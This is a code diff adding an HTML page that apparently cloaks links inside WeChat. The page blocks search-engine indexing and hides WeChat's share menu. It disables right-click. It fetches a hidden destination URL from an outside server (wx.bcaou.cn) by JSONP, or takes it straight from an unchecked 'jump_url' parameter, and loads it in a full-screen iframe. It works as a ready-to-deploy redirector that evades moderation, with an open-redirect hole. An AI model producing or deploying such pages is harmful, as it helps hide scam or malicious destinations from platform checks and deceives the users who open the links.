@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="gb2312">
+		<meta name="Baiduspider" content="noindex,nofollow" />
+		<meta name="Sosospider" content="noindex,nofollow" />
+		<meta name="sogou spider" content="noindex,nofollow" />
+		<meta name="360Spider" content="noindex,nofollow" />
+		<meta name="YodaoBot" content="noindex,nofollow" />
+		<meta name="Googlebot" content="noindex,nofollow" />
+		<meta name="MicroMessenger" content="noindex,nofollow" />
+		<meta name="QQBrowser" content="noindex,nofollow" />
+		<meta content="yes" name="apple-mobile-web-app-capable">
+		<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
+		<title>......</title>
+	</head>
+	<script src="https://libs.baidu.com/jquery/2.0.0/jquery.js"></script>
+	<link rel="stylesheet" href="https://mat1.gtimg.com/pingjs/ext2020/dcom-static/build/static/css/static.css" />
+	<body>
+	<iframe id="aaa" src="https://" width="100%" height="100%">
+
+	</iframe>
+		<script>
+
+			var url,callback,beiy,id,temp,len;
+			callback = getQueryVariable("callback");
+			beiy = getQueryVariable("beiy");
+			id = getQueryVariable("id");
+			jump_url = getQueryVariable("jump_url");
+			window.onload = function(){
+				if(jump_url!=''){
+					document.getElementById("aaa").src =jump_url
+				}else{
+					req();
+				}
+			}
+
+
+
+		function req() {
+			$.ajax({
+				type: "get",
+				url: 'https://wx.bcaou.cn/get.html?callback='+callback+'&beiy='+beiy+'&id='+id,
+				dataType: 'jsonp',
+				contentType: 'application/json',
+				jsonp: "callback",
+				jsonpCallback: "ubotzurl",
+				data:{api:"wxapi"},
+				success: function(result) {
+					url = result.tzurl;
+					temp = window.location + '';
+			    temp = temp.substring(temp.indexOf("url=") + 4);
+					if(temp.charAt(0) == '/'){
+						//alert(url +"" + temp);
+						document.getElementById("aaa").src = url +"" + temp;
+					}else{
+						//alert(url +"" + temp);
+						document.getElementById("aaa").src = url +"/" + temp;
+					}
+
+				},
+				error: function() {
+					alert("loadError");
+				}
+			});
+		}
+
+		function getQueryVariable(variable)
+		{
+		       var query = window.location.search.substring(1);
+		       var vars = query.split("&");
+		       for (var i=0;i<vars.length;i++) {
+		               var pair = vars[i].split("=");
+		               if(pair[0] == variable){return pair[1];}
+		       }
+		       return(false);
+		}
+		</script>
+		<div style="display:none;">
+			....
+		</div>
+		<script>
+			function onBridgeReady() {
+				WeixinJSBridge.call('hideOptionMenu');
+			}
+			if (typeof WeixinJSBridge == "undefined") {
+				if (document.addEventListener) {
+					document.addEventListener('WeixinJSBridgeReady', onBridgeReady, false);
+				} else if (document.attachEvent) {
+					document.attachEvent('WeixinJSBridgeReady', onBridgeReady);
+					document.attachEvent('onWeixinJSBridgeReady', onBridgeReady);
+				}
+			} else {
+				onBridgeReady();
+			}
+			document.oncontextmenu = function() {
+				event.returnValue = false;
+			}
+		</script>
+	</body>
+</html>
